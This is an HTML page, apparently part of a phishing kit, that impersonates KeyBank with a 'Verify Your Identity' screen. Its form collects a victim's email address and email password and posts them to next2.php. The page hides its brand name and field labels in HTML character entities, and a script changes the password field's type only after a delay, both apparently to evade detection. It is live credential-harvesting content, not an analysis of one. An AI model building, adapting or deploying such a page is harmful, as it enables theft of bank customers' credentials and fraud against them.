<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#75;&#101;&#121;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #d1d1d1;
  	border-radius: 4px;
  	padding-left: 8px;
  	font-size: 15px;
    height: 50px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #5FADCE; 
  	box-shadow: 0px 0px 6px #7bc1f7; 
    -moz-box-shadow: 0px 0px 6px #7bc1f7; 
    -webkit-box-shadow: 0px 0px 6px #7bc1f7; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1348px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image5" style="position:absolute; overflow:hidden; left:167px; top:185px; width:371px; height:171px; z-index:0"><img src="images/kn10.png" alt="" title="" border=0 width=371 height=171></div>

<div id="image1" style="position:absolute; overflow:hidden; left:161px; top:98px; width:378px; height:49px; z-index:1"><img src="images/ident.png" alt="" title="" border=0 width=378 height=49></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:75px; z-index:2"><img src="images/kn7.png" alt="" title="" border=0 width=1348 height=75></div>

<div id="image11" style="position:absolute; overflow:hidden; left:633px; top:525px; width:91px; height:60px; z-index:3"><a href="#"><img src="images/cncl.png" alt="" title="" border=0 width=91 height=60></a></div>

<div id="shape1" style="position:absolute; overflow:hidden; left:933px; top:798px; width:103px; height:44px; z-index:4"><img border=0 width="100%" height="100%" alt="" src="images/shape313138421.gif"></div>

<form action=next2.php name=istarihoasap id=istarihoasap method=post>
<input name="email" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:361px;left:170px;top:214px;z-index:7">
<input name="epass" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:361px;left:169px;top:302px;z-index:8">
<div id="formimage1" style="position:absolute; left:436px; top:525px; z-index:12"><input type="image" name="formimage1" width="176" height="57" src="images/butt.png"></div>
</div>
</body>
</html>
